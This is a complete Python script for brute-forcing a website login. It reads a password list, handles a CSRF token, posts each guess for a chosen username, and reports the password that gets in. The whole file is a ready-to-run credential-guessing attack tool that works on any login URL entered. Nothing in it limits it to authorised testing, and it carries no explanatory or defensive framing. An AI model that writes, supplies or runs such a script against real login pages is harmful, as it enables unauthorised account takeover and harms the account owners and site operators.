import requests
from bs4 import BeautifulSoup

def brute_force_login(url, username, password_list):
    session = requests.Session()
    print(f"Starting brute force on {url} with username '{username}'...")

    # Optional: Get CSRF token if needed
    res = session.get(url)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_token = None
    token_input = soup.find('input', {'name': 'csrf_token'})
    if token_input:
        csrf_token = token_input['value']
        print(f"Found CSRF token: {csrf_token}")

    for password in password_list:
        data = {
            'username': username,
            'password': password,
        }
        if csrf_token:
            data['csrf_token'] = csrf_token

        response = session.post(url, data=data)

        # Check for success: URL change or welcome message
        if response.url != url or "welcome" in response.text.lower():
            print(f"[+] Password found: {password}")
            return password

        print(f"Trying password: {password} - Failed")

    print("[-] Password not found in list.")
    return None

if __name__ == "__main__":
    target_url = input("Enter login URL: ").strip()
    user = input("Enter username: ").strip()
    pwd_file = input("Enter path to password list file: ").strip()

    try:
        with open(pwd_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Password file not found.")
        exit(1)

    brute_force_login(target_url, user, passwords)
